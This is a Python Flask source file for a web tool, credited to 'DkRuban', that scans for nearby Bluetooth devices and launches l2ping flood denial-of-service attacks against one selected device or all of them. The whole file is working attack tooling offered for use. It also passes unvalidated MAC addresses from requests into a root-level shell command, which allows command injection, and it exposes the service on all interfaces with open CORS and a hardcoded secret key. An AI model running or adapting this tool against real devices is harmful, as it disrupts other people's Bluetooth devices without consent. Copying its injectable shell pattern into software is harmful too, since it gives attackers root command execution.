from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
import subprocess
import threading
import time
import os
import re
import uuid

# --- Web App Setup ---
app = Flask(__name__)
CORS(app)
app.secret_key = 'your_super_secret_key_here'

# --- Copied from your original script ---
BANNER = r"""
/$$$$$$$  /$$$$$$$$       /$$$$$$  /$$$$$$$$ /$$$$$$  /$$$$$$$  /$$      /$$ | $$__  $$|__  $$__/      /$$__  $$|__  $$__//$$__  $$| $$__  $$| $$$    /$$$ | $$  \ $$   | $$        | $$  \__/   | $$  | $$  \ $$| $$  \ $$| $$$$  /$$$$ | $$$$$$$    | $$ /$$$$$$|  $$$$$$    | $$  | $$  | $$| $$$$$$$/| $$ $$/$$ $$ | $$__  $$   | $$|______/ \____  $$   | $$  | $$  | $$| $$__  $$| $$  $$$| $$ | $$  \ $$   | $$         /$$  \ $$   | $$  | $$  | $$| $$  \ $$| $$\  $ | $$ | $$$$$$$/   | $$        |  $$$$$$/   | $$  |  $$$$$$/| $$  | $$| $$ \/  | $$ |_______/    |__/         \______/    |__/   \______/ |__/  |__/|__/     |__/
"""
CREDITS = [" Created By DkRuban ", " I Hate This World "]

# --- Global Attack Tracker ---
ATTACK_SESSIONS = {}

# --- Helper Functions from your original script ---
def validate_mac(mac):
    """Validate Bluetooth MAC address format (XX:XX:XX:XX:XX:XX)."""
    pattern = r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))

def ensure_hci0_up():
    """Ensure hci0 is up and running."""
    try:
        result = subprocess.check_output("hciconfig", shell=True, timeout=2).decode()
        if "hci0" in result and "DOWN" in result:
            subprocess.run("sudo hciconfig hci0 up", shell=True, timeout=2)
            time.sleep(1)
            result = subprocess.check_output("hciconfig", shell=True, timeout=2).decode()
            if "DOWN" in result:
                return False
        elif "hci0" not in result:
            return False
        return True
    except Exception as e:
        print(f"[!] Error ensuring hci0 up: {e}")
        return False

# --- Web App Routes (Now using real commands) ---

@app.route('/')
def index():
    """Displays the main page."""
    return render_template('index.html', banner=BANNER, credits=CREDITS)

@app.route('/scan', methods=['POST'])
def scan():
    """Performs a REAL scan for nearby Bluetooth devices."""
    if not ensure_hci0_up():
        return jsonify({'status': 'error', 'message': 'Failed to bring hci0 up. Check adapter and permissions.'}), 500
    
    try:
        print("[*] Running hcitool scan...")
        result = subprocess.check_output("hcitool scan", shell=True, timeout=30).decode()
        devices = []
        for line in result.splitlines()[1:]:
            parts = line.strip().split("\t")
            if len(parts) == 2:
                addr, name = parts
                if validate_mac(addr.strip()):
                    devices.append((addr.strip(), name.strip()))
        
        message = f"Found {len(devices)} real devices"
        print(f"[*] {message}")
        return jsonify({'status': 'success', 'devices': devices, 'message': message})

    except subprocess.TimeoutExpired:
        error_msg = "[!] Scan timed out after 30 seconds."
        print(error_msg)
        return jsonify({'status': 'error', 'message': error_msg}), 500
    except Exception as e:
        error_msg = f"[!] Scan failed: {e}"
        print(error_msg)
        return jsonify({'status': 'error', 'message': error_msg}), 500

@app.route('/attack', methods=['POST'])
def attack():
    """Starts a REAL attack in a background thread."""
    data = request.get_json()
    attack_type = data.get('type', 'all')
    session_id = str(uuid.uuid4())

    ATTACK_SESSIONS[session_id] = {'stop_flag': False, 'logs': [], 'status': 'running'}

    if attack_type == 'all':
        devices_to_attack = data.get('devices', [])
        message = f"Starting DoS attack on all {len(devices_to_attack)} devices..."
        threading.Thread(target=run_real_attack, args=(devices_to_attack, session_id)).start()
    else:
        mac = data.get('mac')
        name = data.get('name')
        message = f"Starting DoS attack on {name} ({mac})..."
        threading.Thread(target=run_real_attack, args=([(mac, name)], session_id)).start()

    return jsonify({'status': 'success', 'message': message, 'session_id': session_id})

@app.route('/stop_attack/<session_id>', methods=['POST'])
def stop_attack(session_id):
    """Sets the stop flag for a running attack."""
    if session_id in ATTACK_SESSIONS:
        ATTACK_SESSIONS[session_id]['stop_flag'] = True
        ATTACK_SESSIONS[session_id]['status'] = 'stopped'
        print(f"[*] Stop signal sent for session {session_id}")
        return jsonify({'status': 'success', 'message': 'Stop signal sent.'})
    return jsonify({'status': 'error', 'message': 'Attack session not found.'}), 404

@app.route('/attack_status/<session_id>', methods=['GET'])
def attack_status(session_id):
    """Checks the status/logs of a real attack."""
    if session_id in ATTACK_SESSIONS:
        session_data = ATTACK_SESSIONS[session_id]
        return jsonify({
            'status': 'success',
            'logs': session_data['logs'],
            'is_running': session_data['status'] == 'running'
        })
    return jsonify({'status': 'error', 'message': 'Session not found.'}), 404

def run_real_attack(devices, session_id):
    """This function runs a REAL l2ping attack in the background."""
    try:
        for addr, name in devices:
            if ATTACK_SESSIONS[session_id]['stop_flag']:
                ATTACK_SESSIONS[session_id]['logs'].append("[!] Attack stopped by user.")
                break

            log_message = f"[*] Attacking {name} ({addr}) with l2ping flood..."
            ATTACK_SESSIONS[session_id]['logs'].append(log_message)
            print(log_message)
            
            # The actual attack command
            command = f"l2ping -i hci0 -s 600 -f {addr}"
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Monitor the process and check for the stop flag
            while process.poll() is None:
                if ATTACK_SESSIONS[session_id]['stop_flag']:
                    process.terminate() # Gracefully stop the process
                    process.wait()     # Wait for it to close
                    ATTACK_SESSIONS[session_id]['logs'].append(f"[!] Attack on {addr} stopped by user.")
                    print(f"[!] Attack on {addr} stopped by user.")
                    break
                time.sleep(1)
            
            if not ATTACK_SESSIONS[session_id]['stop_flag']:
                # Check if the command finished on its own (e.g., timed out)
                if process.returncode == 0:
                    ATTACK_SESSIONS[session_id]['logs'].append(f"[+] Attack on {addr} completed.")
                else:
                    error = process.stderr.read()
                    ATTACK_SESSIONS[session_id]['logs'].append(f"[!] Attack on {addr} finished with error: {error}")
                time.sleep(1)

        if not ATTACK_SESSIONS[session_id]['stop_flag']:
            ATTACK_SESSIONS[session_id]['status'] = 'finished'
            ATTACK_SESSIONS[session_id]['logs'].append("[*] All attacks completed.")

    except Exception as e:
        ATTACK_SESSIONS[session_id]['logs'].append(f"[!] An error occurred: {e}")
    finally:
        threading.Timer(10.0, lambda: ATTACK_SESSIONS.pop(session_id, None)).start()

if __name__ == "__main__":
    # IMPORTANT: You must run this with sudo for it to work!
    # sudo python app.py
    app.run(host='0.0.0.0', port=5000)
